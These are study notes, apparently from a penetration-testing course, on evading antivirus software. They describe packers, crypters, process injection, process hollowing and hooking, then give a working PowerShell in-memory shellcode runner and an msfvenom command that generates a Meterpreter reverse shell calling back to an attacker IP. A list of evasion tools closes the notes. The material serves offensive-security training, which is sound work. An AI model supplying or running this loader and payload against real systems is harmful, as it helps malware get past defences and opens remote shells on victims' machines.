# AV Evasion

## On-Disk Evasion
- Packers

Packers generate an executable that is smaller than the original, and it has the same functionalities. The result file has a new signature and as a result, can effectively bypass older and more simplistic AV scanners. The use of **UPX** and other popular packers alone is not sufficient for evasion of modern AV scanners

- Obfuscators

Obfuscators reorganize and mutate code in a way that makes it more difficult to reverse-engineer. This includes replacing instructions with semantically equivalent ones, inserting irrelevant instructions or “dead code”,412 splitting or reordering functions, and so on.

- Crypters

Crypters alters the execuatble code in a cryptographic way, adding a decrypting stub that restores the original code upon execution. This decryption happens in-memory, leaving only the enctypted code on-disk. Encryption is one of the most effective AV evasion technique.

- Software protectors

Anti-reversing, anti-debugging, virtual machine emulation detection... Software protectors were designed for legitimate purposes but can also be used to bypass AV detection.
**The Enigma Protector** is a free tool for protecting our scripts.

## In-Memory Evasion
In-Memory Injections, also known as PE injection is a popular technique used to bypass AVs products. This technique focuses on the manipulation of volatile memory. One of the benefits of this technique is that does not override any files to disk, which is one of the main areas of focus for most AV products.

- Remote Process Memory Injection

This technique attemps to inject the payload into another valid PE that is not malicious. Yhe most common method of doing this is by leveraging a set of Windows APIs.
First, we would use the *OpenProcess* function to obtain a valid *HANDLE* to a target process that we have permissions to access. After obtaining the*HANDLE*, we would 
allocate memory in the context of that process by calling Windows API such as *VirtualAllocEx*. Once the memory has been allocated in the remote process, we would copy the malicious payload to the newly
allocated memory using *WriteProcessMemory*. After the payload has been successfully copied, it is usually executed in memory in a separate thread using the *CreateRemoteThread* API.

- Reflective DLL Injection

Unlike regular DLL injection, which implies loading a malicious DLL from disk using the *LoadLibrary* API, this technique attemps to load a DLL stored by the 
atacker in the process memory.

- Process Hollowing

When using process hollowing to bypass AV software, attackers first launch a non-malicious process in a suspended state. Once launched, the image of the process is removed from
memory and replaced with a malicious executable image. Finally, the process is then resumed and malicious code is executed instead of the legitimate process.

- Inline hooking

As the name suggests, this technique involves modifying memory and introducing a hook (instructions that redirect the code execution) into a function to point the execution flow 
to out malicious code. Upon executing our malicious code, the flow will return back to the modified function and resume rexecution, appearing as if only the original code had 
executed.

## Practical Example
We will use **Avira AV** in our Windows vitmim machine.

- PowerShell In-Memory Injection
Depending on our target environment, we might be able to bypass AV products with the help of PowerShell

A very powerful feature of PowerShell is its ability to interact with the Windows API. This allows us to implement in-memory injection process in a PowerShell script. One of the main benefits of executing a script rather than PE is the fact that is not difficult for AV manufacters to determine if the script is malicious or not as it's run inside an interpreter
and the script itself isn't executable code. 

Furthermore, even if the script is marked as malicious, it can easily be altered. AV software will often look at variable names, comments, and logic, all of which can be changed
without the nedd to re-compile anything.

The script that performs in-memory injection:
```bash
$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocat
ionType, uint flProtect);
[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, 
IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';
$winFunc = 
 Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;
[Byte[]];
[Byte[]]$sc = <place your shellcode here>;
$size = 0x1000;
if ($sc.Length -gt 0x1000) {$size = $sc.Length};
$x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);
for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc
[$i], 1)};
$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
```
The script starts by importing *VirtualAlloc428* and *CreateThread429* from kernel32.dll as well as 
memset from **msvcrt.dll**. These functions will allow us to allocate memory, create an execution 
thread, and write arbitrary data to the allocated memory, respectively. Once again, notice that we 
are allocating the memory and executing a new thread in the current process (powershell.exe), 
rather than a remote one. The script then allocates a block of memory using *VirtualAlloc*, takes each byte of the payload 
stored in the *$sc* byte array, and writes it to our newly allocated memory block using *memset*. As a final step, our in-memory written 
payload is executed in a separate thread using *CreateThread*.

Missing from the script is the payload of our choice, which can be generated using **msfvenom**.
```bash
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.4 LPORT=4444 -f powershell
 ```
 
 ## Tools
 
 - shellter: It is a dynamic shellcode injection tool, and the first truly dynamic PE (portable executable) infector ever created.
 - DSplit: It splits an executable in order to detect AV Signatures. This way we can remove them and execute the file on the target machine.
 - py2exe: This tool allow us to convert a Python script into an executable.
 - Veil: It is a tool designed to generate payloads that bypass common anti-virus solutions.



